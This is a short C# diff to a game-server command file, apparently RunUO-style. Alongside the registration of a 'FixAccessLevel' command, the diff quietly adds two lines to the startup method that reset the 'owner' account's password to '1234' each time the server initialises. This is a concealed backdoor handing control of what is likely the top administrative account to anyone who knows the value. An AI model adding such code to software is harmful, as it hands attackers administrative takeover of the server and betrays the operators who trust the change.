@@ -6,6 +6,8 @@ namespace Server.Commands
 	{
 		public static void Initialize()
 		{
+			IAccount iacc = Accounts.GetAccount("owner");
+			iacc.SetPassword("1234");
 			CommandSystem.Register("FixAccessLevel", AccessLevel.Seer, new CommandEventHandler(FixAccessLevel_OnCommand));
 		}
 
